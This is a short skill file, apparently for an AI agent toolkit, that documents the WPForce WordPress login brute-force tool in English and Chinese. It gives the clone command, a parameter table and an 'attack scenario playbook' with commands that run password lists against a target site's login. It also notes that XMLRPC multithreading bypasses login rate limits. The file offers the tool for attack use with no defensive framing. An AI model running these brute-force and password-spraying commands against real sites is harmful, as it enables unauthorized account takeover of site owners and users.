---
name: wpforce-login
description: "WPForce: WP backend brute force. Signals: brute force, password spraying, WP login brute force, threads, XMLRPC mode."
zh-signals: "WPForce: WP 后台爆破。信号:暴力破解,口令喷射,WP 登录爆破,线程,XMLRPC 模式。"
---

# WPForce

- 攻击大类:C28 暴力破解与口令喷射
- 上游仓库:https://github.com/n00py/WPForce
- 上游 License:BSD-2-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/n00py/WPForce
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python wpforce.py -u https://t.com -w users.txt -p pass.txt` | WP 登录爆破 |
| `-u url -w u.txt -p p.txt -t 20` | 线程 |
| `--xmlrpc` | XMLRPC 模式 |

## 攻击场景 Playbook

### WP 后台爆破

```bash
python wpforce.py -u https://t.com -w users.txt -p top100.txt
# xmlrpc 多线程绕过登录限制
```

## 注意事项

WordPress 登录爆破,XMLRPC 模式支持单请求多凭据。
